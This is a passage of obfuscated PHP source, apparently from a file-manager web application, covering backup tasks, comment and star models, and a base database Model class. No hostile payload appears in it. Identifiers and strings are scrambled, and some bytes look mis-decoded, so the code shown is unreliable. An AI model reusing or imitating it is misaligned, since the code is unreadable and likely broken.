$ÇßÆê¸[819] . $Ñ—Û¬Ù . $ÇßÆê¸[8]; IO::remove($‡å¬ê, !1); return $this->remove($ÊúÓ¿ã“); } public function remove($ÇçÎ³Å‘) { $Î†¾ÆŒ” = $this->listData($ÇçÎ³Å‘); if (!$Î†¾ÆŒ”) { return !0; } return $this->backupRemove($Î†¾ÆŒ”); } private function backupRemove($æ­±¨Â) { parent::remove($æ­±¨Â[$_SERVER[ •ŒÓîÆ][453]]); $œœ†Ö¿‰ = $this->backupPath($æ­±¨Â); IO::remove($œœ†Ö¿‰, !1); return !0; } private function backupPath($Ï¿öÜœ) { $Ì©üÔíò =& $_SERVER[ •ŒÓîÆ]; $ûÁĞÆ“ = $Ï¿öÜœ[$Ì©üÔíò[32]]; $É””¡¦ = Model($Ì©üÔíò[811])->get($Ì©üÔíò[812]); $¥Ô¼ğ÷ = substr(md5($Ì©üÔíò[813] . $É””¡¦ . $ûÁĞÆ“), 0, 8); return "\x7b\x69\x6f\72{$Ï¿öÜœ[$Ì©üÔíò[792]]}\x7d\x2f\x64\x61\x74\141\x62\141\x73\x65\57\x62\x61\x63\x6b\x75\160\x2f" . $ûÁĞÆ“ . $Ì©üÔíò[11] . $¥Ô¼ğ÷; } public function start() { $‰ÑøØ€ =& $_SERVER[ •ŒÓîÆ]; if ($GLOBALS[$‰ÑøØ€[6]][$‰ÑøØ€[91]][$‰ÑøØ€[1916]] != $‰ÑøØ€[90]) { return !0; } $¥‚ŞËüô = $this->config(); if (!$¥‚ŞËüô || $¥‚ŞËüô[$‰ÑøØ€[1660]] != $‰ÑøØ€[90]) { return !1; } $üªıœğ­ = $this->process(); foreach ($üªıœğ­ as $³ı›éØı) { if ($³ı›éØı) { return Task::restart($³ı›éØı[$‰ÑøØ€[453]]); } } $Å»ç¥½´ = new Backup(); $ıŒş¤¶ = $Å»ç¥½´->db(); if ($ıŒş¤¶) { $ıŒş¤¶ = $Å»ç¥½´->dbFile(); if ($ıŒş¤¶ && $¥‚ŞËüô[$‰ÑøØ€[795]] == $‰ÑøØ€[214]) { $ıŒş¤¶ = $Å»ç¥½´->file(); } } Backup::set(array($‰ÑøØ€[791] => 1, $‰ÑøØ€[802] => time())); return !0; } public function process() { $¼›øÊã— =& $_SERVER[ •ŒÓîÆ]; $äÕôÓœÚ = array($¼›øÊã—[798] => Task::get($¼›øÊã—[820]), $¼›øÊã—[803] => Task::get($¼›øÊã—[841]), $¼›øÊã—[216] => Task::get($¼›øÊã—[850])); $èäÀİ­ó = !1; foreach ($äÕôÓœÚ as &$Ëü±É°ã) { if ($èäÀİ­ó) { $Ëü±É°ã = !1; continue; } if ($Ëü±É°ã) { $ôÀ­†ñÇ = intval(_get($Ëü±É°ã, $¼›øÊã—[1695], 0)); if (time() - $ôÀ­†ñÇ > 7200) { Task::kill($Ëü±É°ã[$¼›øÊã—[453]]); $èäÀİ­ó = !0; $Ëü±É°ã = !1; } } } return $äÕôÓœÚ; } public function restore() { $øà·Ê‹ =& $_SERVER[ •ŒÓîÆ]; ActionCall($øà·Ê‹[1101], !0, 1); ActionCall($øà·Ê‹[1101], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\x6d\155\145\x6e\164"; protected $tableMeta = array("\164\x61\x62\x6c\x65\x4e\141\x6d\x65" => "\143\x6f\155\x6d\145\x6e\164\x5f\x6d\x65\x74\x61", "\x6d\145\x74\x61\106\x69\x65\x6c\x64" => "\x63\x6f\x6d\x6d\145\156\x74\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($¿¶¢—°­) { $Ò°ëªÉŞ =& $_SERVER[ •ŒÓîÆ]; if ($¿¶¢—°­[$Ò°ëªÉŞ[1917]]) { $‚÷‚°‘ = $this->where(array($Ò°ëªÉŞ[1918] => $¿¶¢—°­[$Ò°ëªÉŞ[1917]]))->find(); if (!$‚÷‚°‘ || $‚÷‚°‘[$Ò°ëªÉŞ[180]] != $¿¶¢—°­[$Ò°ëªÉŞ[180]] || $‚÷‚°‘[$Ò°ëªÉŞ[550]] != $¿¶¢—°­[$Ò°ëªÉŞ[550]]) { return !1; } $this->where(array($Ò°ëªÉŞ[1918] => $¿¶¢—°­[$Ò°ëªÉŞ[1917]]))->setAdd($Ò°ëªÉŞ[1919], 1); } $¿¶¢—°­[$Ò°ëªÉŞ[1920]] = 0; $¿¶¢—°­[$Ò°ëªÉŞ[1919]] = 0; $¿¶¢—°­[$Ò°ëªÉŞ[791]] = 1; return $this->add($¿¶¢—°­); } public function commentCount($Ùù¾¢Û, $Ùâ´´’ğ, $óë¿»İ™ = false) { $ñƒŸÎïİ =& $_SERVER[ •ŒÓîÆ]; if (!$Ùù¾¢Û) { return array(); } if (is_string($Ùù¾¢Û) || is_int($Ùù¾¢Û)) { $Ùù¾¢Û = array($Ùù¾¢Û); } $Âß¦ÎÛñ = array($ñƒŸÎïİ[550], $ñƒŸÎïİ[1921] => $ñƒŸÎïİ[545]); $Ñù×Ë–Ñ = array($ñƒŸÎïİ[550] => array($ñƒŸÎïİ[7], $Ùù¾¢Û), $ñƒŸÎïİ[180] => $Ùâ´´’ğ); if ($óë¿»İ™) { $Ñù×Ë–Ñ[$ñƒŸÎïİ[1690]] = $óë¿»İ™; } $­Š´ú = $this->field($Âß¦ÎÛñ)->where($Ñù×Ë–Ñ)->group($ñƒŸÎïİ[550])->select(); return array_to_keyvalue($­Š´ú, $ñƒŸÎïİ[550], $ñƒŸÎïİ[545]); } public function starTarget($ˆ»­´èá, $Ì·ËåÁé) { $å‰€öÒì =& $_SERVER[ •ŒÓîÆ]; $™´™ı®Ì = $ˆ»­´èá + self::TYPE_STAR_OFFSET; $¹ôó»äØ = array($å‰€öÒì[1690] => USER_ID, $å‰€öÒì[180] => $™´™ı®Ì, $å‰€öÒì[550] => $Ì·ËåÁé); $ß¹Ö¼µÌ = $this->where($¹ôó»äØ)->find(); if ($ß¹Ö¼µÌ) { return $this->where(array($å‰€öÒì[453] => $ß¹Ö¼µÌ[$å‰€öÒì[453]]))->delete(); } $Œæ¹æıœ = array($å‰€öÒì[1917] => 0, $å‰€öÒì[1690] => USER_ID, $å‰€öÒì[791] => 1, $å‰€öÒì[795] => $å‰€öÒì[12], $å‰€öÒì[180] => $™´™ı®Ì, $å‰€öÒì[550] => $Ì·ËåÁé, $å‰€öÒì[1920] => 0, $å‰€öÒì[1919] => 0); return $this->add($Œæ¹æıœ); } public function starTargetCount($µãá»ï´, $Ôà“ÒÊà) { $ôòêõŒÉ =& $_SERVER[ •ŒÓîÆ]; $É®ö• = $Ôà“ÒÊà + self::TYPE_STAR_OFFSET; $Ô§ö¼µ = $this->commentCount($µãá»ï´, $É®ö•); $ê»ßòšŸ = $this->commentCount($µãá»ï´, $É®ö•, USER_ID); return array($ôòêõŒÉ[1922] => $Ô§ö¼µ, $ôòêõŒÉ[1923] => $ê»ßòšŸ); } public function starTargetUserList($–£²÷‘ğ, $•‰˜ ¿) { $ı¦Ë¦Û =& $_SERVER[ •ŒÓîÆ]; $“ìÆÚ¬ = $–£²÷‘ğ + self::TYPE_STAR_OFFSET; $æŒñÃ“ş = array($ı¦Ë¦Û[550] => $•‰˜ ¿, $ı¦Ë¦Û[180] => $“ìÆÚ¬); $ĞÂ‹ıäƒ = $this->where($æŒñÃ“ş)->count(); $³ÑóÈ = array($ı¦Ë¦Û[310] => $ĞÂ‹ıäƒ, $ı¦Ë¦Û[1924] => array()); if (!$ĞÂ‹ıäƒ) { return $³ÑóÈ; } $ãí”ş¦ = $this->field($ı¦Ë¦Û[1690])->where($æŒñÃ“ş)->limit(500)->select(); $ãí”ş¦ = array_to_keyvalue($ãí”ş¦, $ı¦Ë¦Û[12], $ı¦Ë¦Û[1690]); $³ÑóÈ[$ı¦Ë¦Û[1924]] = Model($ı¦Ë¦Û[558])->userListInfo($ãí”ş¦); return $³ÑóÈ; } public function prasiseUserList($áüÏ§ö—) { $ªãà‹•Í =& $_SERVER[ •ŒÓîÆ]; $òùşô‚µ = array($ªãà‹•Í[1925] => $áüÏ§ö—); $ˆ£ÁÇ¸Ú = $this->where($òùşô‚µ)->find(); $»ø°ş‡ = _get($ˆ£ÁÇ¸Ú, $ªãà‹•Í[1920], 0); $Ö¦¥Ïú = array($ªãà‹•Í[310] => $»ø°ş‡, $ªãà‹•Í[1924] => array()); if (!$»ø°ş‡) { return $Ö¦¥Ïú; } $Šİ–…èö = Model($ªãà‹•Í[1926])->field($ªãà‹•Í[1690])->where($òùşô‚µ)->limit(500)->select(); $Šİ–…èö = array_to_keyvalue($Šİ–…èö, $ªãà‹•Í[12], $ªãà‹•Í[1690]); $Ö¦¥Ïú[$ªãà‹•Í[1924]] = Model($ªãà‹•Í[558])->userListInfo($Šİ–…èö); return $Ö¦¥Ïú; } public function remove($üßŒÎüÜ) { $ÖéİúÙ =& $_SERVER[ •ŒÓîÆ]; $Íîíø¿° = array($ÖéİúÙ[1918] => $üßŒÎüÜ); $›¼ŞïáÀ = $this->where($Íîíø¿°)->find(); if ($›¼ŞïáÀ[$ÖéİúÙ[1917]]) { $this->where(array($ÖéİúÙ[1918] => $›¼ŞïáÀ[$ÖéİúÙ[1917]]))->setAdd($ÖéİúÙ[1919], -1); } return $this->where($Íîíø¿°)->delete(); } public function edit($×—ì¾åÁ, $ÛëïúÌ°) { $±µÑ•”ˆ =& $_SERVER[ •ŒÓîÆ]; $Èˆ• = array($±µÑ•”ˆ[1918] => $×—ì¾åÁ); return $this->where($Èˆ•)->save(array($±µÑ•”ˆ[1927] => $ÛëïúÌ°)); } public function prasise($ùÀÎÔô) { $ûòÎ¾Â =& $_SERVER[ •ŒÓîÆ]; $³ùÜıæğ = Model($ûòÎ¾Â[1928]); $Îø¶­ô™ = array($ûòÎ¾Â[1918] => $ùÀÎÔô, $ûòÎ¾Â[1681] => USER_ID); $ÌÁÛ©‰Ì = $³ùÜıæğ->where($Îø¶­ô™)->find(); if (!$ÌÁÛ©‰Ì) { $³ùÜıæğ->add($Îø¶­ô™); $Á€¾İ = $this->where(array($ûòÎ¾Â[1918] => $ùÀÎÔô))->setAdd($ûòÎ¾Â[1920], 1); } else { $³ùÜıæğ->where($Îø¶­ô™)->delete(); $Á€¾İ = $this->where(array($ûòÎ¾Â[1918] => $ùÀÎÔô))->setAdd($ûòÎ¾Â[1920], -1); } return $Á€¾İ; } public function targetInfo($¬ŒÏÓñş, $€·æÑš½) { $ÙŒ¸°£ =& $_SERVER[ •ŒÓîÆ]; $³¾ıãà® = array($ÙŒ¸°£[628] => $¬ŒÏÓñş, $ÙŒ¸°£[629] => $€·æÑš½); $ñ“›Ä” = $this->where($³¾ıãà®)->count(); $ÊÌë‘øÚ = "\122\x49\x47\x48\x54\40\112\117\x49\116\40{$this->tablePrefix}\143\x6f\x6d\x6d\x65\156\164\x5f\x70\162\x61\x69\x73\x65\x20\x73\164\x61\162\40\157\x6e\40\x63\x6f\155\x6d\145\x6e\164\x2e\x63\157\x6d\x6d\145\x6e\x74\x49\104\x20\x3d\40\x73\x74\x61\x72\56\143\x6f\x6d\x6d\x65\156\164\x49\x44"; $ËÊÒîÑ§ = $this->alias($ÙŒ¸°£[409])->where($³¾ıãà®)->join($ÊÌë‘øÚ, $ÙŒ¸°£[1929])->count(); $ê‹¨¿Ô = array($ÙŒ¸°£[1930] => $ñ“›Ä”, $ÙŒ¸°£[1931] => $ËÊÒîÑ§); return $ê‹¨¿Ô; } public function listData($ëÎäöí) { $ö¶ö‘â² =& $_SERVER[ •ŒÓîÆ]; if (isset($ëÎäöí[$ö¶ö‘â²[1932]])) { if ($ëÎäöí[$ö¶ö‘â²[1932]]) { $ëÎäöí[$ö¶ö‘â²[1925]] = array($ö¶ö‘â²[1055], intval($ëÎäöí[$ö¶ö‘â²[1932]])); } unset($ëÎäöí[$ö¶ö‘â²[1932]]); } if (isset($ëÎäöí[$ö¶ö‘â²[1933]])) { if ($ëÎäöí[$ö¶ö‘â²[1933]]) { $ëÎäöí[$ö¶ö‘â²[1925]] = array($ö¶ö‘â²[1052], intval($ëÎäöí[$ö¶ö‘â²[1933]])); } unset($ëÎäöí[$ö¶ö‘â²[1933]]); } return $this->_listData($ëÎäöí); } private function _listData($®ìÇÈÍŒ) { $«•’Œ‹¥ =& $_SERVER[ •ŒÓîÆ]; $¨ºÃ¬ƒ« = $this->where($®ìÇÈÍŒ)->_makeOrder()->selectPage(100); $this->_listAppendParent($¨ºÃ¬ƒ«[$«•’Œ‹¥[424]]); $this->_listAppendUser($¨ºÃ¬ƒ«[$«•’Œ‹¥[424]]); $this->_listAppendMeta($¨ºÃ¬ƒ«[$«•’Œ‹¥[424]]); return $¨ºÃ¬ƒ«; } private function _makeOrder() { $›ƒ„ è‹ =& $_SERVER[ •ŒÓîÆ]; $Ïğ©‹ùı = array($›ƒ„ è‹[1920], $›ƒ„ è‹[1919], $›ƒ„ è‹[217]); $¨æ‰ª†Ú = Input::get($›ƒ„ è‹[509], $›ƒ„ è‹[7], $›ƒ„ è‹[476], $Ïğ©‹ùı); $÷™âï–Ü = Input::get($›ƒ„ è‹[510], $›ƒ„ è‹[7], $›ƒ„ è‹[1683], array($›ƒ„ è‹[1934], $›ƒ„ è‹[505])); $ïÇœòü = $¨æ‰ª†Ú . $›ƒ„ è‹[53] . $÷™âï–Ü; return $this->order($ïÇœòü); } private function _listAppendParent(&$ùĞŒûÆ) { $–Öá¢÷™ =& $_SERVER[ •ŒÓîÆ]; $›³¡æ¢õ = array_unique(array_to_keyvalue($ùĞŒûÆ, $–Öá¢÷™[12], $–Öá¢÷™[1917])); $›³¡æ¢õ = array_remove_value($›³¡æ¢õ, $–Öá¢÷™[214]); if (!$›³¡æ¢õ) { return; } $Õú´Ï‘Ğ = $this->where(array($–Öá¢÷™[1918] => array($–Öá¢÷™[7], $›³¡æ¢õ)))->select(); $Õú´Ï‘Ğ = array_to_keyvalue($Õú´Ï‘Ğ, $–Öá¢÷™[1925]); foreach ($ùĞŒûÆ as &$Õã¥¥™Ù) { if (isset($Õú´Ï‘Ğ[$Õã¥¥™Ù[$–Öá¢÷™[1917]]])) { $Õã¥¥™Ù[$–Öá¢÷™[1935]] = $Õú´Ï‘Ğ[$Õã¥¥™Ù[$–Öá¢÷™[1917]]]; } } unset($Õã¥¥™Ù); } private function _listAppendUser(&$ù¼´Ô) { $Œ°Ñ‰Üö =& $_SERVER[ •ŒÓîÆ]; $ê”¶Ë„¬ = array_unique(array_to_keyvalue($ù¼´Ô, $Œ°Ñ‰Üö[12], $Œ°Ñ‰Üö[1690])); $ê”¶Ë„¬ = array_remove_value($ê”¶Ë„¬, $Œ°Ñ‰Üö[214]); if (count($ê”¶Ë„¬) == 0) { return; } foreach ($ù¼´Ô as $ª‡Ä—ª) { if (isset($ª‡Ä—ª[$Œ°Ñ‰Üö[1935]])) { $ê”¶Ë„¬[] = $ª‡Ä—ª[$Œ°Ñ‰Üö[1935]][$Œ°Ñ‰Üö[1690]]; } } $¢‚÷Î½è = Model($Œ°Ñ‰Üö[579])->userListInfo($ê”¶Ë„¬); foreach ($ù¼´Ô as &$ª‡Ä—ª) { $ª‡Ä—ª[$Œ°Ñ‰Üö[642]] = $¢‚÷Î½è[$ª‡Ä—ª[$Œ°Ñ‰Üö[1690]]]; if (isset($ª‡Ä—ª[$Œ°Ñ‰Üö[1935]])) { $ª‡Ä—ª[$Œ°Ñ‰Üö[1935]][$Œ°Ñ‰Üö[642]] = $¢‚÷Î½è[$ª‡Ä—ª[$Œ°Ñ‰Üö[1935]][$Œ°Ñ‰Üö[1690]]]; } } unset($ª‡Ä—ª); } private function _listAppendMeta(&$‰Ãó­û÷) { $îÏ„ÂÖ“ =& $_SERVER[ •ŒÓîÆ]; $ˆøİ„‡Æ = array_unique(array_to_keyvalue($‰Ãó­û÷, $îÏ„ÂÖ“[12], $îÏ„ÂÖ“[1925])); $ˆøİ„‡Æ = array_remove_value($ˆøİ„‡Æ, $îÏ„ÂÖ“[214]); if (!$ˆøİ„‡Æ) { return; } foreach ($‰Ãó­û÷ as $ÆÌï¨¹ ) { if (isset($ÆÌï¨¹ [$îÏ„ÂÖ“[1935]])) { $ˆøİ„‡Æ[] = $ÆÌï¨¹ [$îÏ„ÂÖ“[1935]][$îÏ„ÂÖ“[1925]]; } } $˜õá±ò… = $this->metaList($ˆøİ„‡Æ); if (!$˜õá±ò…) { return !1; } foreach ($‰Ãó­û÷ as &$ÆÌï¨¹ ) { $ÆÌï¨¹ [$îÏ„ÂÖ“[518]] = $˜õá±ò…[$ÆÌï¨¹ [$îÏ„ÂÖ“[1925]]]; if (isset($ÆÌï¨¹ [$îÏ„ÂÖ“[1935]])) { $ÆÌï¨¹ [$îÏ„ÂÖ“[1935]][$îÏ„ÂÖ“[518]] = $˜õá±ò…[$ÆÌï¨¹ [$îÏ„ÂÖ“[1935]][$îÏ„ÂÖ“[1925]]]; } } unset($ÆÌï¨¹ ); } private function metaList($ÈöñÄˆ) { $ƒ¯ÙËß =& $_SERVER[ •ŒÓîÆ]; if (!$ÈöñÄˆ) { return array(); } $ã¢€ËäÎ = array($ƒ¯ÙËß[1925] => array($ƒ¯ÙËß[7], $ÈöñÄˆ)); $ú“ÕÒŠ£ = Model($ƒ¯ÙËß[1936])->where($ã¢€ËäÎ)->select(); $ú“ÕÒŠ£ = array_to_keyvalue_group($ú“ÕÒŠ£, $ƒ¯ÙËß[1925]); foreach ($ú“ÕÒŠ£ as $æû§‘‰Ì => $Šª™­è) { $ê¥×æ­å = array(); foreach ($Šª™­è as $¿¿èŞÆµ) { $ê¥×æ­å[$¿¿èŞÆµ[$ƒ¯ÙËß[96]]] = $¿¿èŞÆµ[$ƒ¯ÙËß[429]]; } $ú“ÕÒŠ£[$æû§‘‰Ì] = $ê¥×æ­å; } return $ú“ÕÒŠ£ ? $ú“ÕÒŠ£ : array(); } } class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\137\x66\x69\x6c\x65\x5f\x63\x6f\x6e\164\x65\x6e\x74\163"; protected $dataAuto = array(array("\x63\162\x65\x61\164\145\x54\151\155\x65", "\164\151\155\x65", "\x69\x6e\x73\145\x72\x74", "\x66\x75\156\143\164\x69\x6f\156")); } goto eé…†ó¢é¤; F·ëšé¿­å: define($_SERVER[ •ŒÓîÆ][298], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\142\154\x65", "\x6f\162\x64\x65\x72", "\141\154\x69\141\163", "\x68\141\x76\x69\x6e\147", "\147\162\x6f\165\x70", "\x6c\x6f\143\x6b", "\144\151\163\x74\151\x6e\x63\164", "\x61\x75\164\157", "\146\x69\154\x74\x65\x72", "\166\141\154\x69\x64\141\x74\x65", "\x72\145\163\x75\154\164", "\142\151\156\144", "\164\157\153\x65\x6e"); public function __construct($ºÅ¾öú = '', $×©ñî¯· = '', $¹¹«àü… = '') { $‚İÀºçÇ =& $_SERVER[ •ŒÓîÆ]; $this->_initialize(); if (!empty($ºÅ¾öú)) { if (strpos($ºÅ¾öú, $‚İÀºçÇ[10])) { list($this->dbName, $this->name) = explode($‚İÀºçÇ[10], $ºÅ¾öú); } else { $this->name = $ºÅ¾öú; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($×©ñî¯·)) { $this->tablePrefix = $‚İÀºçÇ[12]; } elseif ($‚İÀºçÇ[12] != $×©ñî¯·) { $this->tablePrefix = $×©ñî¯·; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($‚İÀºçÇ[299]); } $this->db(0, empty($this->connection) ? $¹¹«àü… : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $õãÈ›€Ğ =& $_SERVER[ •ŒÓîÆ]; if (empty($this->fields)) { if (think_config($õãÈ›€Ğ[300])) { $Ö˜ğƒŞ = $this->dbName ? $this->dbName : think_config($õãÈ›€Ğ[301]); $åÂ¼£Õ­ = think_var_cache($õãÈ›€Ğ[302] . strtolower(get_path_this($Ö˜ğƒŞ) . $õãÈ›€Ğ[10] . $this->name)); if ($åÂ¼£Õ­) { $’Úù€ = think_config($õãÈ›€Ğ[303]); if (empty($’Úù€) || $åÂ¼£Õ­[$õãÈ›€Ğ[304]] == $’Úù€) { $this->fields = $åÂ¼£Õ­; return; } } } $this->flush(); } } public function flush() { $Ê…¹±¢Ş =& $_SERVER[ •ŒÓîÆ]; $this->db->setModel($this->name); $¢Ï¹Ÿ = $this->db->getFields($this->getTableName()); if (!$¢Ï¹Ÿ) { return !1; } $this->fields = array_keys($¢Ï¹Ÿ); $this->fields[$Ê…¹±¢Ş[305]] = !1; foreach ($¢Ï¹Ÿ as $×ˆ¾ ‚ => $ª¹¯²‰²) { $ÌíÖşöá[$×ˆ¾ ‚] = $ª¹¯²‰²[$Ê…¹±¢Ş[33]]; if ($ª¹¯²‰²[$Ê…¹±¢Ş[39]]) { $this->fields[$Ê…¹±¢Ş[306]] = $×ˆ¾ ‚; if ($ª¹¯²‰²[$Ê…¹±¢Ş[42]]) { $this->fields[$Ê…¹±¢Ş[305]] = !0; } } } $this->fields[$Ê…¹±¢Ş[307]] = $ÌíÖşöá; if (think_config($Ê…¹±¢Ş[303])) { $this->fields[$Ê…¹±¢Ş[304]] = think_config($Ê…¹±¢Ş[303]); } if (think_config($Ê…¹±¢Ş[300])) { $ö¯œĞÇ = $this->dbName ? $this->dbName : think_config($Ê…¹±¢Ş[301]); think_var_cache($Ê…¹±¢Ş[302] . strtolower(get_path_this($ö¯œĞÇ) . $Ê…¹±¢Ş[10] . $this->name), $this->fields); } } public function switchModel($Ş’©îˆ³, $²»¼ğÄË = array()) { $ÈÇÖ¾… =& $_SERVER[ •ŒÓîÆ]; $ÙİÔâÙ = ucwords(strtolower($Ş’©îˆ³)) . $ÈÇÖ¾…[308]; if (!class_exists($ÙİÔâÙ)) { think_exception($ÙİÔâÙ . think_lang($ÈÇÖ¾…[309])); } $this->_extModel = new $ÙİÔâÙ($this->name); if (!empty($²»¼ğÄË)) { foreach ($²»¼ğÄË as $„ıŸô®) { $this->_extModel->setProperty($„ıŸô®, $this->{$„ıŸô®}); } } return $this->_extModel; } public function __set($¶àùıâß, $Í¶÷µ¯) { $this->data[$¶àùıâß] = $Í¶÷µ¯; } public function __get($Ó£‡” —) { return isset($this->data[$Ó£‡” —]) ? $this->data[$Ó£‡” —] : null; } public function __isset($ÊºãÜ·ä) { return isset($this->data[$ÊºãÜ·ä]); } public function __unset($ÈÕÍ¿•²) { unset($this->data[$ÈÕÍ¿•²]); } public function __call($Æã”Øƒ•, $‚Àä—Í„) { $¹†º é· =& $_SERVER[ •ŒÓîÆ]; if (in_array(strtolower($Æã”Øƒ•), $this->methods, !0)) { $this->options[strtolower($Æã”Øƒ•)] = $‚Àä—Í„[0]; return $this; } elseif (in_array(strtolower($Æã”Øƒ•), array($¹†º é·[310], $¹†º é·[311], $¹†º é·[312], $¹†º é·[313], $¹†º é·[314]), !0)) { $æ¼øœ…  = isset($‚Àä—Í„[0]) ? $‚Àä—Í„[0] : $¹†º é·[205]; $æ¼øœ…  = $this->db->parseKey($æ¼øœ… ); return $this->getField(strtoupper($Æã”Øƒ•) . $¹†º é·[315] . $æ¼øœ…  . $¹†º é·[316] . $Æã”Øƒ•, $¹†º é·[310]); } elseif (strtolower(substr($Æã”Øƒ•, 0, 5)) == $¹†º é·[317]) { $æ¼øœ…  = think_parse_name(substr($Æã”Øƒ•, 5)); $ı‚Ù¡öš[$æ¼øœ… ] = $‚Àä—Í„[0]; return $this->where($ı‚Ù¡öš)->find(); } elseif (strtolower(substr($Æã”Øƒ•, 0, 10)) == $¹†º é·[318]) { $–Š¿ÇÜÚ = think_parse_name(substr($Æã”Øƒ•, 10)); $ı‚Ù¡öš[$–Š¿ÇÜÚ] = $‚Àä—Í„[0]; return $this->where($ı‚Ù¡öš)->getField($‚Àä—Í„[1]); } elseif (isset($this->_scope[$Æã”Øƒ•])) { return $this->scope($Æã”Øƒ•, $‚Àä—Í„[0]); } elseif (method_exists($this, $Æã”Øƒ•)) { array_unshift($‚Àä—Í„, $Æã”Øƒ•); return call_user_func_array(array($this, $¹†º é·[319]), $‚Àä—Í„); } else { return call_user_func_array(array(parent, $Æã”Øƒ•), $‚Àä—Í„); } } protected function call() { $¦Ä»ü‘³ =& $_SERVER[ •ŒÓîÆ]; $”›€œ’ = func_get_args(); $˜íš¹”¿ = array_shift($”›€œ’); $‡ÄÉ¶œ = $˜íš¹”¿; if (is_array($˜íš¹”¿)) { $‡ÄÉ¶œ = $˜íš¹”¿[1]; $˜íš¹”¿ = $˜íš¹”¿[0]; } $°ŞŸ³½ = count($”›€œ’) - 1; if (isset($”›€œ’[$°ŞŸ³½]) && $”›€œ’[$°ŞŸ³½] === $˜íš¹”¿) { think_exception(__CLASS__ . $¦Ä»ü‘³[4] . $˜íš¹”¿ . think_lang($¦Ä»ü‘³[320])); return; } $”›€œ’[] = $˜íš¹”¿; if (method_exists($this, $¦Ä»ü‘³[321])) { $áí¼´£ = call_user_func_array(array($this, $¦Ä»ü‘³[322]), array($‡ÄÉ¶œ, $”›€œ’)); if (!is_null($áí¼´£) && $áí¼´£ !== !1) { return $áí¼´£; } } $ìïÈ˜ìê = call_user_func_array(array($this, $˜íš¹”¿), $”›€œ’); if (method_exists($this, $¦Ä»ü‘³[323])) { $áí¼´£ = call_user_func_array(array($this, $¦Ä»ü‘³[324]), array($‡ÄÉ¶œ, $”›€œ’, $ìïÈ˜ìê)); if ($áí¼´£) { return $áí¼´£; } } return $ìïÈ˜ìê; } protected function _initialize() { } protected function _facade($¼ƒ“úşƒ) { $ ¥Êçò =& $_SERVER[ •ŒÓîÆ]; if (!empty($this->fields)) { foreach ($¼ƒ“úşƒ as $Ø‰Ÿë£Ö => $ÔÈæıää) { if (is_array($this->fields) && !in_array($Ø‰Ÿë£Ö, $this->fields, !0)) { unset($¼ƒ“úşƒ[$Ø‰Ÿë£Ö]); } elseif (is_scalar($ÔÈæıää)) { $this->_parseType($¼ƒ“úşƒ, $Ø‰Ÿë£Ö); } } } if (!empty($this->options[$ ¥Êçò[325]])) { $¼ƒ“úşƒ = array_map($this->options[$ ¥Êçò[325]], $¼ƒ“úşƒ); unset($this->options[$ ¥Êçò[325]]); } $this->_beforeWrite($¼ƒ“úşƒ); return $¼ƒ“úşƒ; } protected function _beforeWrite(&$ƒè½áÙè) { } public function add($ö¢Ò‚ = '', $Ôùê‚Ê = array(), $àæÕı» = false) { if (empty($ö¢Ò‚)) { if (!empty($this->data)) { $ö¢Ò‚ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ •ŒÓîÆ][326]); return !1; } } $Ôùê‚Ê = $this->_parseOptions($Ôùê‚Ê); $ö¢Ò‚ = $this->_facade($ö¢Ò‚); if (!1 === $this->_beforeInsert($ö¢Ò‚, $Ôùê‚Ê)) { return !1; } $™–›÷ì£ = $this->db->insert($ö¢Ò‚, $Ôùê‚Ê, $àæÕı»); if (!1 !== $™–›÷ì£) { $ğôÄÄÃ = $this->getLastInsID(); if ($ğôÄÄÃ) { $ö¢Ò‚[$this->getPk()] = $ğôÄÄÃ; $this->_after_insert($ö¢Ò‚, $Ôùê‚Ê); return $ğôÄÄÃ; } $this->_after_insert($ö¢Ò‚, $Ôùê‚Ê); } return $™–›÷ì£; } protected function _beforeInsert(&$ê¨¼ğ‰°, $»¢×öá) { } protected function _after_insert($‚¾éØöÃ, $›„€Ö÷ç) { } public function addAll($½ıü·½ô, $Å„µ¤ñ = array(), $”ÔëÕ€Î = false) { $Ÿµ’ö´Î =& $_SERVER[ •ŒÓîÆ]; if (empty($½ıü·½ô)) { $this->error = think_lang($Ÿµ’ö´Î[326]); return !1; } $Å„µ¤ñ = $this->_parseOptions($Å„µ¤ñ); foreach ($½ıü·½ô as $Ô«—éÏé => $ÖÙÅ²À) { $½ıü·½ô[$Ô«—éÏé] = $this->_facade($ÖÙÅ²À); } if (method_exists($this->db, $Ÿµ’ö´Î[327])) { $¹™© õ = $this->db->insertAll($½ıü·½ô, $Å„µ¤ñ, $”ÔëÕ€Î); } else { $this->startTrans(); foreach ($½ıü·½ô as $Ô«—éÏé => $ÖÙÅ²À) { $¹™© õ = $this->db->insert($ÖÙÅ²À, $Å„µ¤ñ, $”ÔëÕ€Î); } $this->commit(); } if (!1 !== $¹™© õ) { $Éæ—ÓŒË = $this->getLastInsID(); if ($Éæ—ÓŒË) { return $Éæ—ÓŒË; } } return $¹™© õ; } public function selectAdd($Æıç¨Áú = '', $ÂƒÎÌÙ¿ = '', $¢™¨›Í„ = array()) { $ûË¼¸Ù =& $_SERVER[ •ŒÓîÆ]; $¢™¨›Í„ = $this->_parseOptions($¢™¨›Í„); if (!1 === ($²•™»Öí = $this->db->selectInsert($Æıç¨Áú ? $Æıç¨Áú : $¢™¨›Í„[$ûË¼¸Ù[328]], $ÂƒÎÌÙ¿ ? $ÂƒÎÌÙ¿ : $this->getTableName(), $¢™¨›Í„))) { $this->error = think_lang($ûË¼¸Ù[329]); return !1; } else { return $²•™»Öí; } } public function save($ÅÛåŒ€ = '', 